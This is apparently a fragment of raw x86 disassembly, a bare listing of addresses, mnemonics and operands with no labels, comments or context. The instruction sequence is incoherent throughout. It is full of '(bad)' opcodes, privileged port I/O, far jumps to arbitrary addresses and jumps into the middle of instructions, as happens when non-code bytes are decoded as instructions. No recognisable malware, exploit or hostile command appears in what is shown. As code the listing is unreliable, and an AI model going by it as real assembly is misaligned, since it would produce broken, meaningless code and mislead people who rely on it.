  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
